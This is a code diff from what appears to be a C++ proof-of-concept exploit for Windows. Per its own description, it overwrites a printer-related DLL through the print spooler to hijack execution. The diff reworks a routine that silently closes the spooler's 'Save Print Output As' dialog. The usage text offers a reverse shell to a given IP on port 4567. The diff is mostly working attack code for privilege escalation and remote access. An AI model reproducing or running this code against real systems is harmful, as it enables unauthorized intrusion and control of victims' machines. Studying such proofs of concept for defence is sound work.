@@ -24,7 +24,7 @@ This PoC will overwrite a printer related dll and use it as a hijacking vector. 
 #include<iostream>
 #include<time.h>
 #pragma comment(lib, "rpcrt4.lib")
-#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 using namespace std;
 
 RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
@@ -123,27 +123,19 @@ DWORD WINAPI startSpooler(LPVOID pM){
 	IXpsPrintJob *job = NULL;
 	IXpsPrintJobStream *jobStream = NULL;
 	HRESULT ok = StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, NULL, NULL, 0, NULL, &jobStream, NULL);
-	if (ok == E_POINTER)
-	{
-		cout << "d" << endl;
-		exit(0);
-	}
 	//jobStream->Close();
 	//CoUninitialize();
 	exit(0);
 }
 
-void closeSpoolerWindows()
+DWORD WINAPI closeSpoolerWindows(LPVOID pM)
 {
-	HWND hwnd;
-	do {
-		Sleep(3000);
-		if (hwnd = FindWindowW(L"#32770", L"将打印输出另存为"))
+	HWND hwnd = FindWindowW(L"#32770", L"将打印输出另存为");
+		if (hwnd)
 		{
 			PostMessage(hwnd, WM_CLOSE, 0, 0);
 		}
-	} while (hwnd);
-	exit(0);
+	return 0;
 }
 int mainf(char*data,int wbg)
 {
@@ -182,43 +174,15 @@ int mainf(char*data,int wbg)
 		} while (hFile == INVALID_HANDLE_VALUE);
 		
 		CloseHandle(hFile);
-		//startSpooler(0);
 		CreateThread(NULL, 0, startSpooler, NULL, 0, NULL);
-		//Sleep(2000);
-		closeSpoolerWindows();
-		//HWND hwnd;
-		//do
-		//{
-		//	hwnd = FindWindowW(NULL, L"将打印输出另存为");
-		//	cout << hwnd << endl;
-		//} while (hwnd);
-		//PostMessage(hwnd, WM_CLOSE, 0, 0);
-		//DWORD dwProcessID;
-		//HANDLE hProcess;
-		//if (GetWindowThreadProcessId(hwnd, &dwProcessID) == 0)
-		//{
-		//	return 2;
-		//}
-		//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
-		//if (hProcess == NULL)
-		//{
-		//	return 3;
-		//}
-
-		//if (!TerminateProcess(hProcess, 0))
-		//{
-		//	return 4;
-		//}
-
-		/*HWND hwnd;
-		do
+		//Sleep(5000);
+		while (!(FindWindowW(L"#32770", L"将打印输出另存为")))
 		{
-			hwnd = FindWindow(L"#32770", L"将打印输出另存为");
-		} while (hwnd == NULL);*/
-		//exit(0);
-		//Sleep(6000);
-		//SendMessage(hwnd, WM_CLOSE, 0, 0);
-		//exit(0);
+			CreateThread(NULL, 0, closeSpoolerWindows, NULL, 0, NULL);
+		}
+		
+		Sleep(3000);
+		//closeSpoolerWindows();
 		return 0;
 	}
 	else if (wbg==2)
@@ -251,7 +215,6 @@ void help() {
 	cout << "Usage: -g ip Reverse shell to 4567 port" << endl;
 }
 int main(int argc, char* argv[]) {
-	
 	//错误
 	if (!(argc > 1))
 	{
@@ -259,7 +222,7 @@ int main(int argc, char* argv[]) {
 		exit(0);
 	}
 	//帮助
-	if (strcmp(argv[1], "-h") == 0) {
+	else if (strcmp(argv[1], "-h") == 0) {
 		help();
 		exit(1);
 	}
